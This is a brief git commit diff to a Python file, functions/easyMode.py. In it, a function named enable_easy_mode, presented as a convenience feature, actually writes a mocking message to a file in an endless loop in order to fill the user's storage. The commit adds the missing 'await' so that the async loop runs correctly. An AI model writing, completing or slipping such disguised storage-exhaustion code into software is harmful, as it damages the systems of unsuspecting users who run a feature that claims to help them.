c0578720dc67459db230f83319a49a7a1f47cb57
hackr <hackr8027@gmail.com>
2025-11-12 14:11:41 -0500

    test

--- functions/easyMode.py
+++ functions/easyMode.py
@@ -5,5 +5,5 @@ async def enable_easy_mode():
     with open("functions/easyModeData", "a") as ef:
         while True:
             ef.write("btw easy mode was a lie, enjoy having no storage space\nFILL THE SPACE\n")
-            asyncio.sleep(0.1)
+            await asyncio.sleep(0.1)
             # unless you're reading this, then you get a cookie
